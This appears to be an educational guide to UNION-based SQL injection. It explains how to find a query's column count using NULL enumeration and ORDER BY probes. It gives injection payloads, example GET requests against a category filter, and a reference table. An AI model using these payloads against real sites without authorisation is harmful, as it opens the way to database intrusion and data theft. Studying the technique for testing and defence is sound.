# SQL Injection (SQLi) – UNION-Based Attacks

**Determining the Number of Columns Returned by the Query**

This guide focuses on **UNION-based SQL injection** in scenarios where the application returns query results directly in the response (in-band / classic UNION SQLi).
A common example is a product category filter vulnerable to SQLi (e.g., `/filter?category=Gifts`).

### Goal
Determine **how many columns** the original `SELECT` query returns.
This is a **critical first step** before you can perform a successful UNION attack to extract data from other tables.

### Background: How UNION Works
The `UNION` operator combines the results of two or more `SELECT` queries into a single result set.

**Key Rules for UNION to Succeed:**
- The number of columns in **all** `SELECT` statements **must be identical**.
- The **order** of columns must match.
- The **data types** of corresponding columns must be compatible (or implicitly convertible).

**Simple Example (Valid UNION):**

```sql
SELECT A, B FROM table1
UNION
SELECT C, D FROM table2;
```

**Resulting output (concatenated):**

| A   | B   |
|-----|-----|
| 1   | 2   |
| 3   | 4   |
| 2   | 3   |  ← from table2
| 4   | 5   |  ← from table2

If the column counts don't match → database error (e.g., "incorrect number of columns").

### Why We Need to Find the Column Count
In SQLi, we don't know the original query.
To inject our own `UNION SELECT`, we must match the exact number of columns the backend query returns.
We use two main techniques to discover this number:

### Technique 1: NULL Column Enumeration (Most Common & Reliable)
**Injection Pattern:**
```text
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
...
```

**How it works:**
- Append `UNION SELECT` followed by one or more `NULL` values.
- `NULL` is compatible with almost any data type.
- Keep increasing the number of `NULL`s until the query **succeeds** (no error, normal 200 response).
- The number of `NULL`s that works = **number of columns** in the original query.

**Example Requests (GET parameter):**
```
GET /filter?category=Gifts' UNION SELECT NULL--
GET /filter?category=Gifts' UNION SELECT NULL,NULL--
GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
```

**Interpretation:**
- If you get a **database error** (e.g., 500 or custom error page) → wrong number of columns.
- When you get a **normal 200 response** (possibly with extra empty columns in the output) → **success!**
  → The original query has **exactly that many columns**.

**Tip:** Watch the response body — successful injections often show extra blank/empty table cells or rows.

### Technique 2: ORDER BY Column Counting (Alternative Method)
**Injection Pattern:**
```text
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
```

**How it works:**
- `ORDER BY n` sorts by the nth column in the result set.
- If you request a column number that **doesn't exist** → database error.
- Increment the number until you get an error → previous number = column count.

**Example Requests:**
```
GET /filter?category=Gifts' ORDER BY 1--
GET /filter?category=Gifts' ORDER BY 2--
GET /filter?category=Gifts' ORDER BY 3--
```

**Interpretation:**
- Works fine up to `ORDER BY 3` → normal response.
- `ORDER BY 4` causes error → original query returns **3 columns**.

**Advantages:** Sometimes works when `UNION` is partially filtered.
**Disadvantages:** May not trigger visible errors in all apps; less reliable than NULL method in some cases.

### Quick Reference Table – Injection Examples

| Technique       | Injection Payload (append to vulnerable param)          | What to Look For                  | Success Condition                     |
|-----------------|----------------------------------------------------------|-----------------------------------|---------------------------------------|
| NULL Columns    | `' UNION SELECT NULL--`                                 | Normal 200 response               | Matches original column count         |
| NULL Columns    | `' UNION SELECT NULL,NULL--`                            | Normal 200 response               | 2 columns                             |
| NULL Columns    | `' UNION SELECT NULL,NULL,NULL--`                       | Normal 200 response               | 3 columns                             |
| ORDER BY        | `' ORDER BY 1--`                                        | Normal response                   | At least 1 column                     |
| ORDER BY        | `' ORDER BY 4--`                                        | Error (e.g., 500 or DB message)   | Original query has **3** columns      |

### Best Practices & Tips
- Always start with **Technique 1 (NULL)** — it's more reliable for UNION attacks.
- Use `--` (or `#` in MySQL) to comment out the rest of the original query.
- Single quote `'` is usually used to break out of a string literal.
- If the parameter is numeric (no quotes needed), try without the leading `'`.
- Observe **response differences** carefully: status code, body content, page layout.
- Once you know the column count → next step is identifying **which columns are visible** in the output (e.g., using `' UNION SELECT 'a','b','c'--` to see where text appears).

This is the foundational step for most **in-band UNION SQLi attacks**.
After determining the column count, you can proceed to extract database version, table names, data, etc.

